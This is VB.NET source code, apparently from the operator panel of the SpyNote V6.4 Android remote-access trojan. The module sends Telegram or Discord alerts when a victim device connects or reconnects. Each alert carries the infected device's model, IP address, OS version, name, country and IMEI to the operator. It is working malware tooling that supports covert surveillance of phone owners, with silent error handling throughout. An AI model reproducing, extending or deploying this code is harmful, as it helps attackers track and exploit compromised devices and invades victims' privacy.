Imports System.Net
Imports System.Text
Imports System.Threading.Tasks
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Module DeviceNotifyService
    Private ReadOnly SentKeys As New Collections.Concurrent.ConcurrentDictionary(Of String, DateTime)()
    Private ReadOnly KnownDevices As New Collections.Concurrent.ConcurrentDictionary(Of String, Byte)()
    Private Const DedupMinutes As Double = 1

    Public Sub SendNewDeviceConnected(client As SocketClient, model As String, osVersion As String)
        Try
            If client Is Nothing Then Return

            Dim cfg As NotifySettingsHelper.NotifyConfig = NotifySettingsHelper.LoadNotifyConfig()
            If Not cfg.Enabled Then Return
            If Not NotifyCredentialsConfigured(cfg) Then Return

            Dim deviceKey As String = GetDeviceKey(client)
            If String.IsNullOrWhiteSpace(deviceKey) Then Return

            Dim isFirstSeen As Boolean = Not KnownDevices.ContainsKey(deviceKey)
            If isFirstSeen Then
                KnownDevices(deviceKey) = 0
            End If

            Dim dedupKey As String = "panel:" & deviceKey
            Dim lastSent As DateTime = DateTime.MinValue
            If SentKeys.TryGetValue(dedupKey, lastSent) AndAlso (DateTime.UtcNow - lastSent).TotalMinutes < DedupMinutes Then
                Return
            End If

            Dim ip As String = If(String.IsNullOrWhiteSpace(client.ClientAddressIP), "-", client.ClientAddressIP)
            Dim deviceName As String = If(String.IsNullOrWhiteSpace(client.ClientName), "-", client.ClientName)
            Dim deviceModel As String = If(String.IsNullOrWhiteSpace(model), "-", model.Trim())
            Dim deviceOs As String = If(String.IsNullOrWhiteSpace(osVersion), "-", osVersion.Trim())
            Dim country As String = "-"
            Try
                If client.Flag IsNot Nothing AndAlso client.Flag.Tag IsNot Nothing Then
                    country = client.Flag.Tag.ToString()
                End If
            Catch
            End Try

            Dim header As String = If(isFirstSeen, "New device connected to SpyNote:", "Device reconnected to SpyNote:")
            Dim message As String =
                header & Environment.NewLine &
                "Model: " & deviceModel & Environment.NewLine &
                "IP: " & ip & Environment.NewLine &
                "OS: " & deviceOs & Environment.NewLine &
                "Name: " & deviceName & Environment.NewLine &
                "Country: " & country & Environment.NewLine &
                "IMEI/Key: " & deviceKey

            QueueNotification(cfg, message, dedupKey, client, "Panel notify OK")
        Catch
        End Try
    End Sub

    Public Function SendTestNotification(cfg As NotifySettingsHelper.NotifyConfig, Optional channel As String = "Test") As Boolean
        If Not NotifyCredentialsConfigured(cfg) Then Return False
        Dim message As String = "SpyNote notification test (" & channel & ")" & Environment.NewLine &
            "Time: " & DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
        Return SendConfiguredNotification(cfg, message)
    End Function

    Public Sub ResetNotifyDedup()
        SentKeys.Clear()
        KnownDevices.Clear()
    End Sub

    Public Function NotifyCredentialsConfigured(cfg As NotifySettingsHelper.NotifyConfig) As Boolean
        If cfg Is Nothing Then Return False
        If String.Equals(cfg.NotifyType, "Discord", StringComparison.OrdinalIgnoreCase) Then
            Return Not String.IsNullOrWhiteSpace(cfg.DiscordWebhook)
        End If
        Return Not String.IsNullOrWhiteSpace(cfg.TelegramToken) AndAlso Not String.IsNullOrWhiteSpace(cfg.TelegramChatId)
    End Function

    Public Function SendConfiguredNotification(cfg As NotifySettingsHelper.NotifyConfig, message As String) As Boolean
        Try
            If cfg Is Nothing OrElse Not cfg.Enabled Then Return False
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 Or SecurityProtocolType.Tls11 Or SecurityProtocolType.Tls
            If String.Equals(cfg.NotifyType, "Telegram", StringComparison.OrdinalIgnoreCase) Then
                Return SendTelegram(cfg.TelegramToken, cfg.TelegramChatId, message)
            End If
            If String.Equals(cfg.NotifyType, "Discord", StringComparison.OrdinalIgnoreCase) Then
                Return SendDiscord(cfg.DiscordWebhook, message)
            End If
        Catch
        End Try
        Return False
    End Function

    Public Function SendConfiguredNotificationAsync(cfg As NotifySettingsHelper.NotifyConfig, message As String) As Task(Of Boolean)
        Return Task.FromResult(SendConfiguredNotification(cfg, message))
    End Function

    Private Function GetDeviceKey(client As SocketClient) As String
        If Not String.IsNullOrWhiteSpace(client.ClientImei) Then Return client.ClientImei.Trim()
        If Not String.IsNullOrWhiteSpace(client.ClientRemoteAddress) Then Return client.ClientRemoteAddress.Trim()
        If Not String.IsNullOrWhiteSpace(client.ClientAddressIP) Then Return client.ClientAddressIP.Trim()
        Return Nothing
    End Function

    Private Sub QueueNotification(cfg As NotifySettingsHelper.NotifyConfig, message As String, dedupKey As String, client As SocketClient, okLog As String)
        Dim notifyCfg As NotifySettingsHelper.NotifyConfig = cfg
        Dim clientIp As String = If(String.IsNullOrWhiteSpace(client.ClientAddressIP), "-", client.ClientAddressIP)
        Dim clientRemote As String = client.ClientRemoteAddress
        Dim key As String = dedupKey

        Task.Run(Sub()
                     Try
                         Dim ok As Boolean = SendConfiguredNotification(notifyCfg, message)
                         If ok Then
                             SentKeys(key) = DateTime.UtcNow
                             Try
                                 SN.Data.LogsSpyNote(New String() {clientIp, clientRemote, "Notify", "Sent", Nothing, okLog})
                             Catch
                             End Try
                         Else
                             Try
                                 SN.Data.LogsSpyNote(New String() {clientIp, clientRemote, "Notify", "Failed", Nothing, "Check token/chat id or webhook"})
                             Catch
                             End Try
                         End If
                     Catch ex As Exception
                         Try
                             SN.Data.LogsSpyNote(New String() {clientIp, clientRemote, "Notify", "Failed", Nothing, ex.Message})
                         Catch
                         End Try
                     End Try
                 End Sub)
    End Sub

    Private Function SendTelegram(token As String, chatId As String, text As String) As Boolean
        Try
            If String.IsNullOrWhiteSpace(token) OrElse String.IsNullOrWhiteSpace(chatId) Then Return False
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 Or SecurityProtocolType.Tls11 Or SecurityProtocolType.Tls
            Dim url As String = "https://api.telegram.org/bot" & token.Trim() & "/sendMessage"
            Dim body As String = "chat_id=" & chatId.Trim() & "&text=" & Uri.EscapeDataString(text)
            Using wc As New WebClient()
                wc.Headers(HttpRequestHeader.ContentType) = "application/x-www-form-urlencoded"
                wc.Encoding = Encoding.UTF8
                Dim response As String = wc.UploadString(url, "POST", body)
                Return Not String.IsNullOrWhiteSpace(response) AndAlso response.IndexOf("""ok"":true", StringComparison.OrdinalIgnoreCase) >= 0
            End Using
        Catch
            Return False
        End Try
    End Function

    Private Function SendDiscord(webhookUrl As String, text As String) As Boolean
        Try
            If String.IsNullOrWhiteSpace(webhookUrl) Then Return False
            Dim escaped As String = text.Replace("\", "\\").Replace("""", "'").Replace(vbCr, " ").Replace(vbLf, "\n")
            Dim json As String = "{""content"":""" & escaped & """}"
            Using wc As New WebClient()
                wc.Headers(HttpRequestHeader.ContentType) = "application/json; charset=UTF-8"
                wc.Encoding = Encoding.UTF8
                Dim response As String = wc.UploadString(webhookUrl.Trim(), json)
                Return String.IsNullOrWhiteSpace(response) OrElse response.IndexOf("""code""", StringComparison.OrdinalIgnoreCase) < 0
            End Using
        Catch
            Return False
        End Try
    End Function
End Module
